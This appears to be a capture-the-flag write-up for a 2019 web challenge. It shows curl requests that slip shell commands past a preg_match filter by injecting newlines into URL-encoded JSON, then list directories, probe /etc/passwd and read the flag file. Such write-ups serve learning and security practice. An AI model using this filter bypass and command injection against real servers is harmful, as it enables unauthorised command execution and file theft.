# Question

<img width="494" alt="Screen Shot 2019-06-05 at 12 15 45 PM" src="https://user-images.githubusercontent.com/14992494/58941539-9aa3dc00-87ae-11e9-8515-5df60db6a29f.png">


# Solution

Command : ls
```
NULL@ROOT:TOOLS eloi$ curl http://challenges.fbctf.com:8085/?cmd=%7B%22cmd%22%3A%22ls%22%7D
<html>
  <body>
    <h1>Web Adminstration Interface</h1>

Attempting to run command:<br/>index.php
<br/><br/>
    <form>
      Enter command as JSON:
      <input name="cmd" />
    </form>
  </body>
</html>
```

Command : ls /etc/passwd
```
NULL@ROOT:TOOLS eloi$ curl http://challenges.fbctf.com:8085/?cmd=%7B%22cmd%22%3A%22ls%20/etc/passwd%22%7D
<html>
  <body>
    <h1>Web Adminstration Interface</h1>

Hacking attempt detected<br/><br/>
    <form>
      Enter command as JSON:
      <input name="cmd" />
    </form>
  </body>
</html>
```

Command : ls /etc/passwd
```
NULL@ROOT:TOOLS eloi$ curl http://challenges.fbctf.com:8085/?cmd=%7B%0A%22cmd%22%3A%22ls%20/etc/passwd%22%0A%7D
<html>
  <body>
    <h1>Web Adminstration Interface</h1>

Attempting to run command:<br/>/etc/passwd
<br/><br/>
    <form>
      Enter command as JSON:
      <input name="cmd" />
    </form>
  </body>
</html>
```

Command : ls /home/
```
NULL@ROOT:TOOLS eloi$ curl http://challenges.fbctf.com:8085/?cmd=%7B%0A%22cmd%22%3A%22ls%20/home/%22%0A%7D
<html>
  <body>
    <h1>Web Adminstration Interface</h1>

Attempting to run command:<br/>rceservice
<br/><br/>
    <form>
      Enter command as JSON:
      <input name="cmd" />
    </form>
  </body>
</html>
```

Command : ls /home/rceservice
```
NULL@ROOT:TOOLS eloi$ curl http://challenges.fbctf.com:8085/?cmd=%7B%0A%22cmd%22%3A%22ls%20/home/rceservice%22%0A%7D
<html>
  <body>
    <h1>Web Adminstration Interface</h1>

Attempting to run command:<br/>flag
jail
<br/><br/>
    <form>
      Enter command as JSON:
      <input name="cmd" />
    </form>
  </body>
</html>
```

Command : cat /home/rceservice/flag
```
NULL@ROOT:TOOLS eloi$ curl http://challenges.fbctf.com:8085/?cmd=%7B%0A%22cmd%22%3A%22cat%20/home/rceservice/flag%22%0A%7D
<html>
  <body>
    <h1>Web Adminstration Interface</h1>

Attempting to run command:<br/><br/><br/>
    <form>
      Enter command as JSON:
      <input name="cmd" />
    </form>
  </body>
</html>
```

Command : /bin/cat /home/rceservice/flag
```
NULL@ROOT:TOOLS eloi$ curl http://challenges.fbctf.com:8085/?cmd=%7B%0A%22cmd%22%3A%22/bin/cat%20/home/rceservice/flag%22%0A%7D
<html>
  <body>
    <h1>Web Adminstration Interface</h1>

Attempting to run command:<br/>fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}
<br/><br/>
    <form>
      Enter command as JSON:
      <input name="cmd" />
    </form>
  </body>
</html>
NULL@ROOT:TOOLS eloi$ 
```

# Flag

fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}
